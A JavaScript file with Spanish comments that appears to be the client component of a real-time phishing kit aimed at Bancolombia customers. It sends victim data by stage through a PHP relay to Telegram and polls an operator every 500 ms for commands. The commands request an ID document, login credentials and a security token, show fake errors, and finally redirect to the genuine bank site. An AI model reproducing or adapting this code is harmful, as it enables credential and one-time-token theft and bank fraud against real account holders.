/**
 * TELEGRAM INTEGRATION MANAGER - VERSIÓN OPTIMIZADA
 * Maneja comunicación con Telegram y polling de acciones en tiempo real
 */

'use strict';

class TelegramManager {
    constructor() {
        this.checkInterval = null;
        this.checking = false;
        this.sessionId = null;
        this.lastPollTime = 0;
    }
    
    // ===== OBTENER SESSION ID =====
    async getSessionId() {
        if (this.sessionId) return this.sessionId;
        
        try {
            const response = await fetch('get-session.php');
            const data = await response.json();
            this.sessionId = data.sessionId;
            console.log('📋 Session ID:', this.sessionId);
            return this.sessionId;
        } catch (error) {
            console.error('❌ Error obteniendo session ID:', error);
            return null;
        }
    }
    
    // ===== ENVIAR A TELEGRAM =====
    async sendToTelegram(stage, data) {
        await this.getSessionId();
        
        try {
            const response = await fetch('send-telegram.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ stage, data })
            });
            
            const result = await response.json();
            console.log('📤 Datos enviados a Telegram:', stage, data);
            return result;
        } catch (error) {
            console.error('❌ Error enviando a Telegram:', error);
            return { success: false };
        }
    }
    
    // ===== POLLING =====
    async startPolling() {
        if (this.checking) return;
        
        await this.getSessionId();
        this.checking = true;
        this.lastPollTime = Date.now();
        
        console.log('🔄 Polling iniciado para session:', this.sessionId);
        
        // Polling cada 500ms (más rápido)
        this.checkInterval = setInterval(() => this.checkAction(), 500);
    }
    
    stopPolling() {
        if (this.checkInterval) {
            clearInterval(this.checkInterval);
            this.checkInterval = null;
        }
        this.checking = false;
        console.log('⏹️ Polling detenido');
    }
    
    async checkAction() {
        try {
            const timestamp = Date.now();
            const response = await fetch(`check-action.php?t=${timestamp}`);
            const data = await response.json();
            
            if (data && data.action) {
                console.log('✅ ACCIÓN DETECTADA:', data.action);
                this.handleAction(data.action);
            }
        } catch (error) {
            console.error('❌ Error en polling:', error);
        }
    }
    
    // ===== MANEJAR ACCIONES =====
    handleAction(action) {
        this.stopPolling();
        
        // Ocultar overlay
        const overlay = document.querySelector('.loading-overlay');
        if (overlay) {
            overlay.classList.remove('active');
        }
        
        console.log('🚀 Ejecutando acción:', action);
        
        // Ejecutar acción sin delay para evitar doble carga
        switch (action) {
            case 'error_documento':
                window.location.replace('index.php?error=documento');
                break;
            
            case 'pedir_logo':
                window.location.replace('next-step.php');
                break;
            
            case 'error_logo':
                window.location.replace('next-step.php?error=credenciales');
                break;
            
            case 'pedir_token':
                // Abrir modal de token
                if (window.tokenModalController) {
                    window.tokenModalController.openTokenModal();
                }
                break;
            
            case 'finalizar':
                window.location.replace('https://www.bancolombia.com');
                break;
            
            default:
                console.log('⚠️ Acción desconocida:', action);
        }
    }
}

// Inicializar
document.addEventListener('DOMContentLoaded', () => {
    window.telegramManager = new TelegramManager();
    console.log('✅ Telegram Manager initialized');
});
